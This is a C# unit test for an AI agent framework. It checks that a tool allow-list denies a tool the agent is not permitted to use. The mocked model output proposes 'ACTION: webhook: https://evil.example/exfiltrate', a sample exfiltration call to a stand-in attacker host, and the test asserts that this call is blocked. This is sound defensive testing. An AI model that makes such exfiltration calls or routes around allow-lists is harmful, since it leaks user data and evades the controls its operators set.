// ---------------------------------------------------------------
// Copyright (c) Hassan Habib All rights reserved.
// Licensed under the The Standard Software License (TSSL)
// ---------------------------------------------------------------

using Standard.Agents.Models.Clients.Agents;
using Standard.Agents.Models.Foundations.Skills;
using FluentAssertions;
using Moq;
using Standard.Agents.Brokers.Generators;
using Standard.Agents.Brokers.Knowledges;
using Standard.Agents.Brokers.Mcps;
using Standard.Agents.Brokers.Memorys;
using Standard.Agents.Brokers.Skills;
using Xunit;
using Standard.Agents.Models.Brokers.Generators;

namespace Standard.Agents.Tests.Unit.Acceptance;

public class ToolAllowListTests
{
    [Fact]
    public async Task ShouldDenyAToolThatIsNotOnTheAllowListEndToEndAsync()
    {
        // given
        var generator = new Mock<IGeneratorBroker>();
        generator.Setup(broker =>
            broker.GenerateAsync(It.IsAny<string>(), It.IsAny<string>()))
                .ReturnsAsync("ACTION: webhook: https://evil.example/exfiltrate");

        generator.Setup(broker => broker.GenerateAsync(
            It.IsAny<string>(), It.IsAny<string>(), It.IsAny<ResolvedInference>()))
                .Returns((string systemPrompt, string userPrompt, ResolvedInference _) =>
                    generator.Object.GenerateAsync(systemPrompt, userPrompt));

        generator.Setup(broker =>
            broker.GenerateStreamAsync(
                It.IsAny<string>(), It.IsAny<string>(), It.IsAny<CancellationToken>()))
                .Returns(OneReply("ACTION: webhook: https://evil.example/exfiltrate"));

        generator.Setup(broker => broker.GenerateStreamAsync(
            It.IsAny<string>(), It.IsAny<string>(), It.IsAny<ResolvedInference>(),
            It.IsAny<CancellationToken>()))
                .Returns((
                    string systemPrompt,
                    string userPrompt,
                    ResolvedInference _,
                    CancellationToken token) =>
                        generator.Object.GenerateStreamAsync(systemPrompt, userPrompt, token));

        var mcp = new Mock<IMcpBroker>();

        var skills = new Mock<ISkillBroker>();
        skills.Setup(broker => broker.SelectSkillsAsync()).ReturnsAsync(new List<Skill>());
        var memory = new Mock<IMemoryBroker>();
        memory.Setup(broker => broker.SelectMemoriesAsync()).ReturnsAsync([]);
        var knowledge = new Mock<IKnowledgeBroker>();
        knowledge.Setup(broker => broker.SelectKnowledgeAsync(It.IsAny<string>())).ReturnsAsync([]);

        var agent = new StandardAgent()
            .UseGenerator(generator.Object)
            .UseSkills(skills.Object)
            .UseMemory(memory.Object)
            .UseKnowledge(knowledge.Object)
            .UseMcp(mcp.Object)
            .MaxTurns(1)
            .AllowTools("calculator");

        // when — the brain proposes a tool outside the allow-list
        List<string> streamed = [];

        await foreach (AgentStreamEvent streamEvent in
            agent.StreamPromptAsync("call the webhook"))
        {
            streamed.Add(streamEvent.Content);
        }

        // then — it is denied at the perimeter, and no external tool is ever invoked. The
        // denial is visible on the stream; the capped run itself delivers no answer, because
        // a denial notice is not one.
        streamed.Should().Contain(content => content.Contains("not permitted"));

        mcp.Verify(broker =>
            broker.CallAsync(It.IsAny<string>(), It.IsAny<string>()),
                Times.Never);
    }

    private static async IAsyncEnumerable<string> OneReply(string reply)
    {
        await Task.CompletedTask;

        yield return reply;
    }
}
